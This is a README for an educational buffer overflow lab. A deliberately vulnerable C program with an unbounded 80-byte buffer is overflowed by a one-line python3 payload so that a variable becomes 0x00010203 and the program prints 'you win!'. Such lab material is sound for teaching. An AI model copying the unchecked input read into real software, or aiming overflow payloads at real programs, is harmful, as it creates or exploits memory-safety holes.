# Buffer Overflow Test

## 📌 Overview
This project demonstrates a simple **buffer overflow exploit** in C using controlled input to overwrite a variable and trigger a specific condition. The script automates the process of finding the correct payload length to overwrite the `foo` variable and print "you win!" without causing a segmentation fault.

## 🛠️ How It Works
- The vulnerable C program (`SAfeC`) contains a buffer (`buf[80]`) and an integer `foo`.
- User input is read into `buf` without bounds checking.
- If `foo` is overwritten with `0x00010203`, the program prints **"you win!"**.
- Our script finds the exact number of bytes required to trigger this condition cleanly.

## 🚀 Usage Instructions
### **1. Build the Project Using Makefile**
Ensure you have `gcc` installed, then compile the program using the provided `Makefile`:
```bash
make
```
This will generate the executable `SAfeC`.

To clean up compiled files, use:
```bash
make clean
```

### **2. Run the Buffer Overflow Testing Script**
Execute the script to find the correct payload size:
```bash
chmod +x buffer_overflow_test.sh
./buffer_overflow_test.sh
```

### **3. Expected Output**
Once the correct payload is found, the script will print:
```bash
✅ Found correct payload size: 100 bytes
Correct payload command:
python3 -c "print('\x03\x02\x01\x00' * 25)" | ./SAfeC
```
Then, running this command will produce:
```bash
you win!
```

## 🖥️ How The Exploit Works (Memory Layout)
|------|--------------------------------------------|------------------------------------------|
| Step | Explanation                                | Memory State                             |
|------|--------------------------------------------|------------------------------------------|
| 1    | User input fills `buf`                     | `buf[80]` is full                        |
| 2    | Input overflows into `foo`                 | `foo` gets overwritten with `0x00010203` |
| 3    | Condition `if (foo == 0x00010203)` is met  | Program prints "you win!"                |
| 4    | Execution continues normally               | No segmentation fault                    |
|------|---------------------------------------------------------------------------------------|

## ⚠️ **Disclaimer**
This project is for educational purposes only. Do not use this knowledge for unethical hacking or unauthorized testing. Always ensure you have permission before testing security vulnerabilities.

💡 Stay safe, hack responsibly, and have fun exploring system security! 🔥